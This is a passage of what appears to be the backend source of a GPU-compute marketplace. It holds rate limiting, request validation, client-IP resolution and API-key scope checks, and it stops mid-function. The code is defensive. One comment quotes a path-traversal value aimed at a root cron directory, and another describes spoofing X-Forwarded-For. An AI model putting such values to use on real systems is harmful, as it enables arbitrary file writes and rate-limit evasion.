        "frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'"
    )
    # Never let a browser or proxy cache an authenticated response (Bearer, API-key, OR the
    # browser session cookie).
    if (request.headers.get("Authorization") or request.headers.get("X-API-KEY")
            or request.cookies.get(SESSION_COOKIE)):
        response.headers["Cache-Control"] = "private, no-store"
    return response


# ---------------------------------------------------------------------------
# Rate limiting. Credential endpoints are the ones that actually get attacked;
# an unlimited /login is a free brute-force oracle. In-process fixed window —
# fine for a single instance; move to Redis when we run more than one.
# ---------------------------------------------------------------------------
_RL_BUCKETS: dict = {}
_RL_RULES = {           # path -> (max_hits, window_seconds)
    "/register_user": (10, 3600),  # signup spam
    "/withdraw": (10, 3600),       # money-out probing
    "/route": (60, 60),            # unauth, DB-backed — cap total volume per IP
    "/newsletter/subscribe": (10, 3600),  # public signup — anti-abuse / no email bombing
    "/create_api_key": (30, 3600),  # authed — bound key-minting so a hijacked session can't flood
    # money-in probing: each failed authorize is a Stripe API call + a rejected reservation
    # attempt (bad spec / insufficient funds / non-payout-ready seller / validation). Cap the
    # FAILURE rate so a hijacked session or scripted probe can't hammer it; legitimate,
    # SUCCESSFUL job launches never consume budget (not in _RL_COUNT_ALL), so a real buyer
    # running a sweep of valid jobs is never throttled.
    "/payments/authorize": (30, 3600),
}
# Paths where EVERY request (not just failures) consumes budget. Credential endpoints
# count only failures (brute-force guard); an unauthenticated DB-backed endpoint like
# /route — and the public newsletter signup — must cap total request volume so they can't
# be used as a bulk/email-bombing oracle.
_RL_COUNT_ALL = {"/route", "/newsletter/subscribe", "/create_api_key"}
LOGIN_MAX_FAILS, LOGIN_WINDOW_S = 10, 900


def _rl_blocked(key: str, limit: int, window: int):
    """True (+retry secs) if this key has burned its failure budget.

    Uses Redis for a SHARED counter across gunicorn workers when Redis is configured (the
    in-process dict below is per-worker, so with N workers the real limit is N×). Falls
    back to the in-process window when Redis is unavailable — the limiter never fails open
    on a Redis outage; it just reverts to per-worker counting."""
    try:
        import redis_client
        if redis_client.available():
            count = redis_client.read_window(f"rlc:{key}")
            if count is not None and count >= limit:
                return window  # conservative retry hint; exact reset not tracked in cache
    except Exception:  # noqa: BLE001
        pass
    now = time.time()
    hits = [t for t in _RL_BUCKETS.get(key, []) if now - t < window]
    _RL_BUCKETS[key] = hits
    if len(hits) >= limit:
        return int(window - (now - hits[0])) + 1
    return None


def _rl_record_failure(key: str, window: int = 3600):
    try:
        import redis_client
        if redis_client.available():
            redis_client.incr_window(f"rlc:{key}", window)
    except Exception:  # noqa: BLE001
        pass
    now = time.time()
    _RL_BUCKETS.setdefault(key, []).append(now)
    if len(_RL_BUCKETS) > 10000:      # crude bound; prevents unbounded growth
        for k in [k for k, v in _RL_BUCKETS.items() if not v or now - v[-1] > 3600]:
            _RL_BUCKETS.pop(k, None)


def _rate_limit_key(request: Request) -> str:
    # must use the trusted-proxy-aware IP: a raw X-Forwarded-For read would let an
    # attacker rotate the header and bypass the limit entirely.
    return f"{_client_ip(request) or '?'}:{request.url.path}"


@app.middleware("http")
async def _rate_limit(request: Request, call_next):
    path = request.url.path
    rule = _RL_RULES.get(path)
    if not rule or request.method != "POST":
        return await call_next(request)
    limit, window = rule
    key = _rate_limit_key(request)
    # Use the SHARED limiter helpers (Redis-backed across workers, in-process fallback) —
    # no direct _RL_BUCKETS manipulation here.
    retry = _rl_blocked(key, limit, window)
    if retry:
        obsmod.inc_metric("petabyte_ratelimit_blocks_total",
                          route=obsmod.bounded_route(path),
                          environment=obsmod.ENVIRONMENT)
        obs.event(EVENTS.RATELIMIT_BLOCKED, level=logging.WARNING,
                  message="rate limit exceeded",
                  route=obsmod.bounded_route(path), retry_after_seconds=int(retry))
        return JSONResponse(
            status_code=429,
            headers={"Retry-After": str(int(retry))},
            content={"error": {"code": "RATE_LIMIT_EXCEEDED",
                               "message": f"Too many attempts. Try again in {int(retry)} seconds.",
                               "retry_after_seconds": int(retry)}},
        )
    response = await call_next(request)
    # Credential endpoints consume budget only on FAILURE (brute-force guard); count-all
    # paths (e.g. /route) consume budget on every request to cap total volume.
    if response.status_code >= 400 or path in _RL_COUNT_ALL:
        _rl_record_failure(key, window)
    return response


# ------------------- MODELS -------------------

class SpecModel(BaseModel):
    cpu: int = Field(gt=0)
    ram: int = Field(gt=0, description="RAM in GB")
    duration: int = Field(gt=0, description="Max rentable hours offered")
    price_per_hour: float = Field(gt=0, description="USD per hour")
    provider: str
    gpu_model: Optional[str] = None
    gpu_count: int = Field(default=0, ge=0)
    vram_gb: int = Field(default=0, ge=0)
    units: int = Field(default=1, ge=1, description="Identical rentable units")
    region: Optional[str] = None
    country: Optional[str] = None
    min_price: Optional[float] = Field(default=None, gt=0, description="Auto-price floor")
    max_price: Optional[float] = Field(default=None, gt=0, description="Auto-price ceiling")
    auto_price: bool = Field(default=False, description="Opt in to demand pricing")

    @field_validator("provider", "gpu_model", "region", "country")
    @classmethod
    def _safe_labels(cls, v, info):
        # These are rendered into other users' pages (marketplace, admin) — reject any
        # HTML/JS metacharacters at write time so a listing can never carry stored XSS.
        return _clean_label(v, field=info.field_name, maxlen=64)


class RequestVMModel(BaseModel):
    spec_id: int
    hours: int = Field(gt=0, le=8760)          # <=1 year; also gated by wallet funds
    vpn: bool = False
    require_confidential: bool = False
    require_region: Optional[str] = None
    require_country: Optional[str] = None
    org_id: Optional[int] = None


class NewsletterModel(BaseModel):
    email: str = Field(min_length=3, max_length=254)

    @field_validator("email")
    @classmethod
    def _ok(cls, v: str) -> str:
        # Normalize server-side — never trust frontend validation: trim, lowercase, cap
        # length, and reject anything that is not a plausible address.
        v = (v or "").strip().lower()
        if not v:
            raise ValueError("Enter your email address.")
        if len(v) > 254:
            raise ValueError("That email address is too long.")
        import re as _re
        if not _re.fullmatch(r"[^@\s]+@[^@\s]+\.[^@\s]+", v):
            raise ValueError("That does not look like an email address.")
        return v


class VideoModel(BaseModel):
    # accept a full YouTube URL or a bare ID; we extract the ID server-side
    video: str = Field(min_length=1, max_length=200)
    # optional explicit override; else we infer from the URL (a /shorts/ link => portrait)
    orientation: Optional[str] = Field(default=None, pattern="^(portrait|landscape)$")


class DemoRequestModel(BaseModel):
    name: str = Field(min_length=1, max_length=120)
    email: str = Field(min_length=3, max_length=200)
    organization: Optional[str] = Field(default=None, max_length=200)
    role: Optional[str] = Field(default=None, max_length=40)
    workload: Optional[str] = Field(default=None, max_length=2000)
    message: Optional[str] = Field(default=None, max_length=2000)
    preferred_time: Optional[str] = Field(default=None, max_length=200)
    source: Optional[str] = Field(default=None, max_length=80)

    @field_validator("email")
    @classmethod
    def _looks_like_email(cls, v: str) -> str:
        v = v.strip()
        if "@" not in v or "." not in v.split("@")[-1]:
            raise ValueError("That does not look like an email address.")
        return v


class UserRegisterModel(BaseModel):
    username: str = Field(min_length=3, max_length=64)
    password: str = Field(min_length=12, max_length=128)   # length beats complexity rules
    ref: Optional[str] = Field(default=None, max_length=16)   # referral code (optional)

    @field_validator("username")
    @classmethod
    def _safe_username(cls, v: str) -> str:
        # Usernames are rendered into the admin console + payout tables. Constrain the
        # charset at registration so a username can never carry stored XSS (< > & " ' `).
        return _clean_label(v, field="username", maxlen=64, required=True)

    @field_validator("password")
    @classmethod
    def _not_a_terrible_password(cls, v: str) -> str:
        # Length is the strongest single lever. Beyond that, the only rule worth having
        # is "don't pick one of the passwords everybody picks" — complexity theatre
        # (must contain a symbol!) mostly produces Password1!
        if v.lower() in COMMON_PASSWORDS:
            raise ValueError("That password is one of the most commonly used — pick another.")
        if len(set(v)) < 5:
            raise ValueError("Password is too repetitive.")
        return v


class RoleModel(BaseModel):
    role: str = Field(description="'buyer' or 'seller'")


class AttestationModel(BaseModel):
    spec_id: int
    attestation: dict
    signature: str
    pubkey: str


class HeartbeatModel(BaseModel):
    spec_id: int


class TaskCreateModel(BaseModel):
    booking_id: int
    task_type: str = Field(description="'notebook' | 'vm' | 'template'")
    code: Optional[str] = None
    vm_type: Optional[str] = None
    cpu: Optional[int] = None
    ram: Optional[int] = None
    cuda: bool = False
    template: Optional[str] = None              # ollama|vllm|comfyui|sd-webui|tensorrt-llm
    template_params: Optional[dict] = None      # {model: "..."} etc.
    priority: int = 0
    backup_enabled: bool = False
    backup_interval_s: int = 300        # snapshot cadence (recovery point)
    volume: Optional[str] = None        # logical data volume to back up

    @field_validator("volume")
    @classmethod
    def _safe_volume(cls, v):
        # This string is interpolated into filesystem paths and a `tar` command that
        # runs AS ROOT on the seller's machine. Anything but a strict slug (no dots,
        # no slashes) could traverse out of the intended volume tree. Reject early.
        if v is None:
            return v
        import re as _re
        if not _re.fullmatch(r"[a-z0-9][a-z0-9-]{0,62}", v):
            raise ValueError("volume must be a lowercase slug: [a-z0-9-], up to 63 chars, "
                             "starting alphanumeric (no dots or slashes)")
        return v


class ProgressModel(BaseModel):
    task_id: int
    percent: int
    message: Optional[str] = None


class LogModel(BaseModel):
    task_id: int
    line: str


class BenchmarkResultModel(BaseModel):
    spec_id: int
    tokens_sec: float
    meta: Optional[dict] = None
    proof: dict
    signature: str


class BenchmarkDispatchModel(BaseModel):
    spec_id: int


class CheckpointModel(BaseModel):
    task_id: int
    snapshot_ref: str
    size_bytes: int = 0
    content_hash: Optional[str] = None
    proof: dict
    signature: str


class RestoreModel(BaseModel):
    checkpoint_id: Optional[int] = None   # default: latest


class IdleFallbackModel(BaseModel):
    spec_id: int
    enabled: bool


class IdleReportModel(BaseModel):
    spec_id: int
    algo: str
    hashrate: float = 0.0
    est_daily_usd: float = 0.0


class DiskRentalModel(BaseModel):
    spec_id: int
    enabled: bool
    # provider + alloc_gb are REQUIRED to enable (validated in the handler) — disk rental is an
    # explicit configured contribution, never a defaulted "fallback".
    provider: Optional[str] = Field(None, max_length=16)   # storj | btfs | sia
    alloc_gb: Optional[int] = Field(None, ge=1, le=1_000_000)  # seller's GB cap (>=1)


class DiskReportModel(BaseModel):
    spec_id: int
    provider: str = Field(max_length=16)
    used_gb: float = Field(0.0, ge=0)
    est_daily_usd: float = Field(0.0, ge=0)


class EmailModel(BaseModel):
    email: str
    notify_email: bool = True


class PayoutMethodModel(BaseModel):
    kind: str                         # gift_card|usdc|bank
    destination: str                  # email | wallet address | account ref
    label: Optional[str] = None
    password: Optional[str] = None    # step-up re-auth: a stolen token is not enough


class WithdrawModel(BaseModel):
    method_id: int
    amount: float = Field(gt=0)
    instant: bool = False           # pay a small fee for immediate cash-out; default = free/scheduled


class ScheduleModel(BaseModel):
    method_id: int
    day_of_week: int = Field(ge=0, le=6)      # 0=Mon .. 6=Sun
    hour: int = Field(ge=0, le=23)
    minute: int = Field(default=0, ge=0, le=59)
    utc_offset_minutes: int = 0                # local tz offset
    min_amount: float = 1.0


class SolveModel(BaseModel):
    workload: str = "inference"                 # inference|train|render|...
    gpu_class: Optional[str] = None             # e.g. H100
    min_vram: Optional[int] = None
    region: Optional[str] = None
    country: Optional[str] = None
    confidential: bool = False
    redundancy: int = 1
    hours: int = 1
    max_price_per_hour: Optional[float] = None
    min_reputation: Optional[float] = None


class QuickLaunchModel(BaseModel):
    template: str                               # e.g. blender, comfyui, minecraft
    hours: int = Field(default=1, gt=0, le=8760)
    max_price_per_hour: Optional[float] = None
    region: Optional[str] = None
    spec_id: Optional[str] = None               # pin to a host the buyer explicitly chose
    template_params: Optional[dict] = None


class UploadUrlModel(BaseModel):
    filename: str


class TranscodeModel(BaseModel):
    # Bounds keep a single request from fanning out or over-allocating without limit.
    # nodes is also capped by live inventory, but an explicit ceiling fails fast and
    # keeps absurd values out of the router/DB.
    input_ref: str                       # object-storage ref to the source video
    codec: str = "h264"                  # h264|h265|av1
    resolution: Optional[str] = None     # e.g. 1920x1080
    bitrate: Optional[str] = None        # e.g. 5M  (or use crf)
    crf: Optional[int] = Field(default=None, ge=0, le=51)   # valid ffmpeg CRF range
    container: str = "mp4"
    use_gpu: bool = True                 # NVENC
    duration_seconds: int = Field(default=0, ge=0, le=2_592_000)   # <=30 days
    nodes: int = Field(default=1, ge=1, le=256)
    hours: int = Field(default=1, ge=1, le=8760)                   # <=1 year
    gpu_class: Optional[str] = None
    region: Optional[str] = None

    @field_validator("container")
    @classmethod
    def _safe_container(cls, v):
        # `container` is used as a file EXTENSION joined into a path on the seller host by the
        # transcode/stitch agent (seg{i}.{container}, final.{container}), which runs as root.
        # Anything but a known container token is a path-traversal / arbitrary-file-write primitive
        # (e.g. "../../../etc/cron.d/x"). Mirror the strict handling the `volume` field already gets.
        v = (v or "mp4").strip().lower()
        if v not in {"mp4", "mkv", "webm", "mov", "avi", "ts", "m4v", "flv", "wmv"}:
            raise ValueError("container must be one of: mp4, mkv, webm, mov, avi, ts, m4v, flv, wmv")
        return v

    @field_validator("codec")
    @classmethod
    def _safe_codec(cls, v):
        v = (v or "h264").strip().lower()
        if v not in {"h264", "h265", "hevc", "av1", "vp9"}:
            raise ValueError("codec must be one of: h264, h265, hevc, av1, vp9")
        return v


class RenderModel(BaseModel):
    blend_ref: str                       # object-storage ref to the .blend file
    frame_start: int = Field(ge=0, le=10_000_000)
    frame_end: int = Field(ge=0, le=10_000_000)
    samples: int = Field(default=128, ge=1, le=100_000)
    hours: int = Field(default=1, ge=1, le=8760)
    nodes: int = Field(default=1, ge=1, le=256)
    gpu_class: Optional[str] = None
    region: Optional[str] = None

    @model_validator(mode="after")
    def _frames_sane(self):
        if self.frame_end < self.frame_start:
            raise ValueError("frame_end must be >= frame_start")
        if self.frame_end - self.frame_start + 1 > 1_000_000:
            raise ValueError("frame range too large (max 1,000,000 frames per job)")
        return self


class InputUrlModel(BaseModel):
    task_id: int
    ref: str                     # object-storage ref to a job input (e.g. the .blend)


class BackupUrlModel(BaseModel):
    task_id: int
    filename: str = "snapshot.tar.enc"


class RestoreUrlModel(BaseModel):
    task_id: int
    snapshot_ref: str


class JobResultModel(BaseModel):
    task_id: int
    result: Optional[str] = None
    status: str = "completed"
    proof: dict                 # must include 'ts' and 'output_hash'
    signature: str              # Ed25519 signature over canonical proof


class DispatchTestModel(BaseModel):
    spec_id: int
    difficulty: str = "easy"


class DepositModel(BaseModel):
    amount: float = Field(gt=0)


class OrgCreateModel(BaseModel):
    name: str = Field(min_length=2, max_length=80)

    @field_validator("name")
    @classmethod
    def _safe_name(cls, v: str) -> str:
        # Org names appear in member-facing UI — same anti-XSS charset rule as usernames.
        return _clean_label(v, field="org name", maxlen=80, required=True)


class OrgMemberModel(BaseModel):
    username: str
    role: str = "member"


class OrgRoleModel(BaseModel):
    role: str


class TotpEnableModel(BaseModel):
    code: str = Field(min_length=6, max_length=10)
    password: str


class TotpDisableModel(BaseModel):
    password: str
    code: Optional[str] = None


# ---- Persistent volumes (content-addressed, incremental snapshots) ----
_SHA256_RE = re.compile(r"^[0-9a-f]{64}$")


class VolumeCreateModel(BaseModel):
    name: str = Field(min_length=1, max_length=80)
    size_limit_gb: Optional[int] = Field(default=None, ge=1, le=1_000_000)

    @field_validator("name")
    @classmethod
    def _safe_name(cls, v: str) -> str:
        return _clean_label(v, field="volume name", maxlen=80, required=True)


class SnapshotFileModel(BaseModel):
    path: str = Field(min_length=1, max_length=1024)
    sha256: str
    size: int = Field(ge=0, le=5_000_000_000_000)   # per-file logical size (<=5 TB)

    @field_validator("sha256")
    @classmethod
    def _hex(cls, v: str) -> str:
        v = str(v or "").strip().lower()
        if not _SHA256_RE.match(v):
            raise ValueError("sha256 must be 64 lowercase hex characters")
        return v

    @field_validator("path")
    @classmethod
    def _path(cls, v: str) -> str:
        v = str(v or "").strip()
        if not v or "\x00" in v:
            raise ValueError("path is required")
        return v


class SnapshotPlanModel(BaseModel):
    # A snapshot manifest is bounded so a single request can't enumerate an unbounded file set.
    files: list[SnapshotFileModel] = Field(max_length=200_000)


class SnapshotCreateModel(BaseModel):
    files: list[SnapshotFileModel] = Field(max_length=200_000)
    label: Optional[str] = Field(default=None, max_length=120)
    vm_id: Optional[str] = Field(default=None, max_length=120)

    @field_validator("label", "vm_id")
    @classmethod
    def _safe(cls, v):
        return _clean_label(v, field="label", maxlen=120, required=False) if v else v


class OrgDepositModel(BaseModel):
    amount: float = Field(gt=0)
    budget_cap: Optional[float] = None


class ChallengeModel(BaseModel):
    spec_id: int


class TEEProveModel(BaseModel):
    spec_id: int
    report: dict          # {nonce, measurement, vendor, ts}
    signature: str        # vendor/enclave signature over canonical report


class VMDetailsModel(BaseModel):
    task_id: int
    vm_type: str
    vm_id: str
    ip_address: Optional[str] = None
    port: Optional[int] = None
    connection_string: Optional[str] = None
    status: str = "running"


# ------------------- AUTH HELPERS -------------------
# get_current_user / _username / api_key_user / oauth2_scheme now live in deps.py (imported
# above) so domain routers can share them without importing main.

# Only these peers may set X-Forwarded-For. If the socket peer isn't a trusted
# proxy, the header is attacker-controlled: anyone could send
# `X-Forwarded-For: 1.1.1.1` to dodge rate limits or fake their country.
TRUSTED_PROXIES = {p.strip() for p in os.getenv(
    "TRUSTED_PROXIES", "127.0.0.1,::1").split(",") if p.strip()}


def _client_ip(request: Request):
    """The real client IP, resilient to header spoofing.

    Forwarding headers are consulted ONLY when the direct peer is a declared trusted proxy
    (nginx). Our nginx sets `X-Real-IP $remote_addr` (the true peer it saw — a client cannot
    forge it, proxy_set_header overwrites any client value) and
    `X-Forwarded-For $proxy_add_x_forwarded_for` (== "<client-sent XFF>, $remote_addr", so a
    client can PREPEND spoofed entries and the real address is the RIGHT-most one nginx
    appended). Taking the LEFT-most XFF entry would trust attacker input, letting anyone forge
    their IP to defeat per-IP rate-limits, fake their country, or reach loopback-gated
    endpoints (e.g. token-less /internal/metrics). So: trust X-Real-IP, else walk
    X-Forwarded-For from the RIGHT past any trusted hops."""
    peer = request.client.host if request.client else None
    if peer not in TRUSTED_PROXIES:
        return peer                       # direct, untrusted peer -> use it verbatim
    real = (request.headers.get("X-Real-IP") or "").strip()
    if real:
        return real
    xff = request.headers.get("X-Forwarded-For")
    if xff:
        for hop in reversed([h.strip() for h in xff.split(",") if h.strip()]):
            if hop not in TRUSTED_PROXIES:
                return hop                # first non-proxy hop from the right = real client
    return peer


def _fail_json(status: int, code: str, message: str):
    """Structured error for public marketing endpoints (no idempotency plumbing)."""
    raise HTTPException(status_code=status, detail={"code": code, "message": message})


def _email_booking_link(lead):
    """Email the requester their self-scheduling link (Cal.com).

    This is the flow the founder asked for: instead of a back-and-forth to find a time,
    the person gets a calendar link and picks a slot that fits both sides. Best-effort;
    a send failure must never lose the lead, which is already committed."""
    if not CAL_BOOKING_URL:
        return
    try:
        from notify_providers import get_email_provider
        subject = "Book your Petabyte demo"
        body = (f"Hi {lead.name},\n\n"
                f"Thanks for asking to see Petabyte. Pick a time that suits you here — "
                f"it lands on our calendar and yours:\n\n"
                f"  {CAL_BOOKING_URL}\n\n"
                f"On the call we'll show you the live marketplace, launch a real GPU, and "
                f"walk through your workload"
                + (f" ({lead.workload})." if lead.workload else ".")
                + "\n\nSee you soon,\nPetabyte")
        get_email_provider().send(lead.email, subject, body)
    except Exception:
        logger.exception("failed to email booking link to lead %s", lead.public_id)


def _email_admins(db, subject: str, body: str) -> None:
    """Email every address named in ADMIN_USERS (e.g. info@petabyte.market) directly.

    This does not depend on an admin having a User row — the founder inbox is
    configuration, so a demo lead / booking always reaches it. Best-effort; also
    records an in-app notification for any admin User that matches."""
    from notify_providers import get_email_provider
    provider = get_email_provider()
    for addr in _admin_allowlist():
        if "@" not in addr:
            continue
        try:
            provider.send(addr, subject, body)
        except Exception:
            logger.exception("failed to email admin address")


def _notify_founder_of_lead(db, lead):
    """Tell the founder a demand signal just arrived.

    Two channels, both best-effort (a failure must never lose the lead, which is
    already committed): (1) an in-app notification for every admin User, and (2) a
    direct email to the configured ADMIN_USERS inbox (info@petabyte.market), so the
    founder is notified even if info@ has no User row."""
    who = lead.organization or lead.name
    subject = f"Demo request from {who}"
    body = (f"{lead.name} ({lead.email}) — role: {lead.role or 'n/a'}, "
            f"org: {lead.organization or 'n/a'}. Workload: {lead.workload or 'n/a'}. "
            f"Ref {lead.public_id}.")
    try:
        from db import User
        for a in db.query(User).filter(User.role == "admin").all():
            notifications.notify(db, a.id, "demo.requested", subject=subject, body=body)
    except Exception:
        logger.exception("failed to notify admin users of demo lead %s", lead.public_id)
    try:
        _email_admins(db, subject, body)
    except Exception:
        logger.exception("failed to email ADMIN_USERS of demo lead %s", lead.public_id)


def _require_seller(db: Session, user: dict):
    owner = get_user_by_username(db, _username(user))
    if not owner or owner.role != "seller":
        raise HTTPException(status_code=403, detail="Only sellers allowed")
    return owner


def seller_actor(request: Request, db: Session = Depends(get_db)):
    """Resolve the acting seller from EITHER a JWT (Authorization: Bearer) or an
    X-API-KEY. Lets a node bootstrap itself (register spec + attest) with just its
    API key — no username/password on the machine."""
    owner = None
    auth = request.headers.get("Authorization", "")
    key = request.headers.get("X-API-KEY")
    # EXPLICIT credentials win over the ambient browser cookie, in this precedence: a Bearer
    # header (CLI), then an X-API-KEY (node), then finally the HttpOnly session cookie (browser).
    # This stops a stray cookie from hijacking an explicitly API-key-authenticated node call.
    if auth.startswith("Bearer "):
        try:
            owner = get_user_by_username(db, _username(verify_token(auth[7:])))
        except Exception:
            owner = None
    elif key:
        try:
            data = decode_api_key(key)
            if not is_jti_revoked(db, data["jti"]):
                owner = get_user_by_username(db, data["u"])
        except Exception:
            owner = None
    elif request.cookies.get(SESSION_COOKIE):
        try:
            owner = get_user_by_username(db, _username(verify_token(request.cookies.get(SESSION_COOKIE))))
        except Exception:
            owner = None
        # A browser (ambient cookie) mutating via seller_actor must pass CSRF, same as any other
        # cookie-authenticated write. Bearer / API-key callers carry no ambient authority.
        if owner is not None:
            enforce_csrf(request)
    if owner is None:
        raise HTTPException(status_code=401, detail="Sign in or provide a valid X-API-KEY")
    if owner.role != "seller":
        raise HTTPException(status_code=403, detail="Only sellers allowed")
    return owner


# api_key_user (X-API-KEY agent auth) now lives in deps.py (imported above).

# Keys minted before scopes existed carry none. Treating "no scopes" as FULL ACCESS
# means a parsing bug, a bad migration, or a truncated field silently becomes root.
# So: default deny, with one explicit escape hatch that must be written down.
FULL_ACCESS = "*"
# What a key can do when the caller doesn't ask for anything narrower. This is what a
# seller's node agent needs: prove itself, heartbeat, claim work, report results.
# Deliberately does NOT include payouts, org admin, or key minting — a machine sitting
# in someone's living room should not be able to move money.
DEFAULT_KEY_SCOPES = ("node", "jobs")
LEGACY_KEYS_ARE_FULL_ACCESS = os.getenv("LEGACY_KEYS_FULL_ACCESS", "false").lower() == "true"

# Paid data API: metered, pay-as-you-go against the wallet balance. Each account gets a small
# monthly TRIAL (not a giveaway); past it, calls cost DATA_API_PRICE_PER_1K/1000 x the endpoint's
# price weight, debited from the wallet. Premium datasets are priced higher via DATA_API_UNITS.
DATA_API_FREE_CALLS_MONTH = int(os.getenv("DATA_API_FREE_CALLS_MONTH", "100"))   # monthly trial
DATA_API_PRICE_PER_1K = float(os.getenv("DATA_API_PRICE_PER_1K", "0.50"))        # base rate / 1k
DATA_SNAPSHOT_INTERVAL_S = int(os.getenv("DATA_SNAPSHOT_INTERVAL_S", "3600"))
# Per-endpoint price weight (commodity = 1; premium = higher). A weighted call costs
# base_price x weight and consumes `weight` of the trial. Tiered, honest monetization.
DATA_API_UNITS = {
    "gpu-prices": 1, "market": 1, "availability": 1, "savings": 1,
    "gpu-prices/history": 2, "workloads": 2,
    "demand": 4, "templates": 4, "benchmarks": 5,      # premium: realized $ + the data moat
}
# A published SANDBOX key: lets developers exercise the real request/auth/response flow FREE and
# unmetered (no account, no wallet, never charged). Safe to publish — it only unlocks read access.
# It lives in its OWN namespace (the `pk_sandbox_` prefix) so it can NEVER be confused with, or used
# in place of, a real minted API key: seller/node/jobs keys are Fernet ciphertext tokens (they start
# with `gAAAAA`), so a `pk_sandbox_`-prefixed literal can never be a valid real key, and a real key
# can never look like the sandbox key. We refuse to honour a sandbox value that lacks the prefix
# (fail-closed) so a real key can't be aliased into free data access by misconfiguration.
# Distributed (multi-node cluster) jobs: the most GPUs one job may span across DISTINCT nodes.
MAX_DISTRIBUTED_NODES = int(os.getenv("MAX_DISTRIBUTED_NODES", "100"))
# Spare-disk rental: hard ceiling on how much disk one node may pledge (safety bound on input).
MAX_DISK_ALLOC_GB = int(os.getenv("MAX_DISK_ALLOC_GB", "100000"))    # 100 TB
# Platform commission on storage-network earnings (same shape as NICEHASH_TAKE_RATE).
STORAGE_TAKE_RATE = float(os.getenv("STORAGE_TAKE_RATE", "0.10"))
# Honest reference: representative net $/TB/month a node earns on a decentralized storage network,
# used ONLY for the pre-commit earnings estimate shown to sellers (not a payout figure).
DISK_REFERENCE_USD_PER_TB_MONTH = float(os.getenv("DISK_REFERENCE_USD_PER_TB_MONTH", "1.5"))

DATA_API_SANDBOX_KEY_PREFIX = "pk_sandbox_"
DATA_API_SANDBOX_KEY = os.getenv("DATA_API_SANDBOX_KEY", "pk_sandbox_petabyte_dev").strip()
if DATA_API_SANDBOX_KEY and not DATA_API_SANDBOX_KEY.startswith(DATA_API_SANDBOX_KEY_PREFIX):
    logger.error("DATA_API_SANDBOX_KEY must start with %r to stay namespaced away from real API "
                 "keys — disabling the sandbox key until it is fixed.", DATA_API_SANDBOX_KEY_PREFIX)
    DATA_API_SANDBOX_KEY = ""


def require_scope(user, scope: str):
    # A JWT session is an interactive human who already authenticated with a password.
    # Scopes exist to LIMIT machine keys, not to gate logged-in users; role and
    # ownership checks still apply to them separately.
    if not getattr(user, "_is_api_key", False):
        return
    scopes = getattr(user, "_scopes", None) or []
    if FULL_ACCESS in scopes:
        return                                  # deliberately privileged key
    if not scopes:
        # A scopeless key. Only honoured if the operator explicitly opted in to the
        # legacy behaviour during a migration window — never by accident.
        if LEGACY_KEYS_ARE_FULL_ACCESS:
            logger.warning("legacy scopeless API key used for '%s' — re-mint it", scope)
            return
        raise HTTPException(
            status_code=403,
            detail={"code": "API_KEY_MISSING_SCOPES",
                    "message": "This API key has no scopes. Create a new key with the "
                               f"'{scope}' scope."})
    if scope not in scopes:
        raise HTTPException(
            status_code=403,
            detail={"code": "API_KEY_SCOPE_MISSING",
                    "message": f"This API key lacks the '{scope}' scope."})


# ------------------- HEALTH -------------------

@app.get("/", response_class=HTMLResponse)
def landing():
    return LANDING_HTML

@app.get("/app", include_in_schema=False)
def dashboard_redirect():
    # The old standalone buyer dashboard was folded into the unified console. Keep /app as a
    # permanent redirect so existing links, emails and OAuth bookmarks land on /console.
    return RedirectResponse(url="/console", status_code=308)

@app.get("/investors", response_class=HTMLResponse)
def investors_page():
    return INVESTORS_HTML

@app.get("/developers", response_class=HTMLResponse)
def developers_page():
    # The published sandbox key is shown in the docs so devs can try the live endpoints for free.
    return DEVELOPERS_HTML.replace("{{SANDBOX_KEY}}", DATA_API_SANDBOX_KEY)

@app.get("/install", response_class=HTMLResponse)
def install_page():
    return INSTALL_HTML

@app.get("/roi", response_class=HTMLResponse)
def roi_page():
    return ROI_HTML

@app.get("/keys", response_class=HTMLResponse)
def keys_page():
    return KEYS_HTML

@app.get("/marketplace", response_class=HTMLResponse)
def marketplace_page():
    return MARKETPLACE_HTML

@app.get("/admin", response_class=HTMLResponse)
def admin_page():
    return ADMIN_HTML

@app.get("/admin/funding-view", response_class=HTMLResponse)
def admin_funding_view():
    # Static shell only; it reveals nothing until an admin token loads data from the
    # admin-gated /admin/funding endpoint (safe to serve publicly, like /admin).
    return FUNDING_VIEW_HTML

@app.get("/login", response_class=HTMLResponse)
def login_page():
    return LOGIN_HTML

@app.get("/account", response_class=HTMLResponse)
def account_page():
    return ACCOUNT_HTML

# Static public web surface (marketing / legal / trust / status / info) lives in web_routes.py
# as the first slice of the staged main.py -> domain-routers extraction. Zero DB/auth coupling.
app.include_router(web_router)
# Model hub: discover / download / manage open models (pages + /api/models/*). Backed by the
# provider-independent `modelhub` library — the same code the `petabyte model` CLI uses.
app.include_router(models_router)

@app.get("/launch", response_class=HTMLResponse)
def launch_page():
    """Guided 'Launch Compute' experience (AWS-EC2-style): choose a curated workload
    template (or custom code), a compatible verified host, review the server-priced cost,
    and launch. Config is read client-side from ?template=/?spec= query and sessionStorage;
    every price/placement/charge is recomputed server-side (/estimate, /route, /launch,
    /payments/*)."""
    return HTMLResponse(LAUNCH_HTML)

def _find_installer(name: str):
    """Locate a bundled installer script across dev + deployed layouts.

    The CANONICAL source (lumaris_agent/) wins over the deploy-copied installers/ snapshot:
    a stale committed installers/ copy (e.g. missing the container egress firewall) must never
    be served ahead of the current, secure agent script — that was a real seller-security
    regression on Docker/compose deploys. Generated artifacts with no canonical source (the
    agent.tar.gz bundle) still fall back to installers/."""
    here = os.path.dirname(__file__)
    for cand in (
        os.path.join(here, "..", "lumaris_agent", name),  # canonical source of truth
        os.path.join(here, "installers", name),           # deploy snapshot / built artifacts
    ):
        if os.path.exists(cand):
            return cand
    return None

def _release_pubkey_pem() -> str:
    """The release verification PUBLIC key (from the PETABYTE_RELEASE_PUBKEY variable, a base64
    raw Ed25519 key) as a PEM — the form the node's update.sh pins and openssl verifies against.
    Empty when unset/invalid, which keeps signed auto-update OFF (fail-closed) rather than
    pinning a bad key."""
    b64 = os.getenv("PETABYTE_RELEASE_PUBKEY", "").strip()
    if not b64:
        return ""
    try:
        import base64 as _b64
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
        from cryptography.hazmat.primitives import serialization as _ser
        raw = _b64.b64decode(b64, validate=True)
        if len(raw) != 32:
            return ""
        return Ed25519PublicKey.from_public_bytes(raw).public_bytes(
            _ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo).decode()
    except Exception:
        return ""


def _render_install_sh(*, api_url=None, api_key=None, price=None):
    """The Linux installer, ready to serve. Always substitutes the pinned release pubkey. When
